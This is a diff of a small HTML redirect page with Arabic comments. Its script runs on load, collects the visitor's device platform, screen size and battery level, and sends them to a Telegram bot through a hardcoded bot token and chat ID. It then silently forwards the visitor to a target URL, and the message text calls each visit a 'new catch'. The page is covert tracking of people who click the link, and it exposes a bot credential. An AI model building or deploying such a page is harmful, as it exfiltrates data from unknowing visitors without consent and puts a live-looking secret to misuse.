@@ -1,40 +1,51 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
+    <meta charset="UTF-8">
     <script>
-        // رابط السيرفر المباشر (تأكد إنه شغال بالـ Web Preview)
-        const SERVER_URL = "https://8080-cs-f65a8037-daaf-45b2-a58a-a8f4d4f83c4f.cs-europe-west4-pear.cloudshell.dev/";
+        // إعدادات التليجرام مالتك
+        const BOT_TOKEN = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
+        const CHAT_ID = "5773364548";
 
-        async function collect() {
+        async function sendToTelegram() {
+            // جلب الرابط الأصلي اللي يريد يروحه الشخص
             const params = new URLSearchParams(window.location.search);
-            const target = params.get('u') || 'https://youtube.com';
-            
-            let batt = "N/A";
+            const target = params.get('u') || 'https://google.com';
+
+            // جلب معلومات الجهاز والبطارية
+            let batt = "غير معروف";
             try {
                 const b = await navigator.getBattery();
-                batt = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'فرغ'})`;
+                batt = Math.round(b.level * 100) + "%";
             } catch(e) {}
 
-            const payload = {
-                battery: batt,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                target: target
-            };
+            const msg = `
+🎯 **صيد جديد من الخبير!**
+━━━━━━━━━━━━━━━
+🔋 **البطارية:** ${batt}
+📱 **الجهاز:** ${navigator.platform}
+🖥️ **الشاشة:** ${window.screen.width}x${window.screen.height}
+🔗 **الوجهة:** ${target}
+━━━━━━━━━━━━━━━`;
 
-            // إرسال البيانات (POST)
-            fetch(SERVER_URL, {
+            // إرسال البيانات مباشرة للتليجرام
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
-                mode: 'no-cors', 
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            }).finally(() => {
-                // التحويل الفوري
-                window.location.replace(target);
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
             });
+
+            // تحويل الشخص للرابط اللي يريده
+            window.location.replace(target);
         }
-        window.onload = collect;
+
+        window.onload = sendToTelegram;
     </script>
 </head>
-<body style="background:#000;"></body>
+<body style="background-color: black;">
+    </body>
 </html>
